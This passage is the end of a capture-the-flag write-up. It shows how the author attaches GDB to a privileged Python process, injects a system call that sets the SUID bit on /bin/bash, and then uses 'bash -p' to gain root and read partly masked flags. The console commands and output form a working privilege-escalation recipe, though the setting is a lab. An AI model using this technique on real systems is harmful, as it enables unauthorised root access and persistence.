```
Run GDB and attach to the process. Next we are going to call the function system and chmod bash with a suid bit.

```call (void)system("chmod u+s /bin/bash")```

```console
(gdb) attach 689
Attaching to program: /usr/bin/python3.8, process 689
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
0x00007f4041a3e42a in _start () from /lib64/ld-linux-x86-64.so.2
(gdb) call system("chmod u+s /bin/bash")
'system@plt' has unknown return type; cast the call to its declared return type
(gdb) call (void)system("chmod u+s /bin/bash")

Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007f4041a5a7cb in malloc (n=20) at dl-minimal.c:49
49      dl-minimal.c: No such file or directory.
The program being debugged was signaled while in a function called from GDB.
GDB remains in the frame where the signal was received.
To change this behavior use "set unwindonsignal on".
Evaluation of the expression containing the function
(malloc) will be abandoned.
When the function is done executing, GDB will silently stop.
(gdb) 

```
After running the command it may seem like it broke but if we run bash -p we can execute as root and cat both of the flags!


```console
developer@faculty:/tmp$ bash -p
bash-5.0# id
uid=1001(developer) gid=1002(developer) euid=0(root) groups=1002(developer),1001(debug),1003(faculty)
bash-5.0# cat /home/developer/user.txt
a22c5***************************
*****
bash-5.0# cat /root/root.txt
bcfca***************************
bash-5.0# 
```

GG!
